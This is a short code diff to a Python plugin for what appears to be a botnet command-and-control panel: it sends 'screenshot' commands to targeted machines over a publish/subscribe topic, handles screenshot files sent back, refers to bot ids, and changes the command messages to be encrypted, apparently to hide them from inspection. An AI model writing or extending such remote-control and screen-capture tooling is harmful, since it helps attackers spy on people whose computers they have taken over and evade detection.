@@ -19,14 +19,13 @@ class ScreenshotPlugin(BasePlugin):
 
         # Send screenshot command
         cmd = {'type': 'command', 'target': target, 'action': 'screenshot'}
-        self.parent.client.publish(self.parent.topic, json.dumps(cmd))
+        cmd_json = json.dumps(cmd)
+        encrypted_cmd = self.parent.encrypt_message(cmd_json)
+        self.parent.client.publish(self.parent.topic, encrypted_cmd)
         self.parent.log_area.append(f"Sent screenshot command to {target}")
 
     def handle_response(self, data):
         if data.get('type') == 'screenshot_response':
-            ip = data['ip']
-            bot_id = data['id']
-            target = f"{ip}:{bot_id}"
             file_name = data.get('message', 'screenshot.png')
             file_data = data.get('file_data', '')
             try:
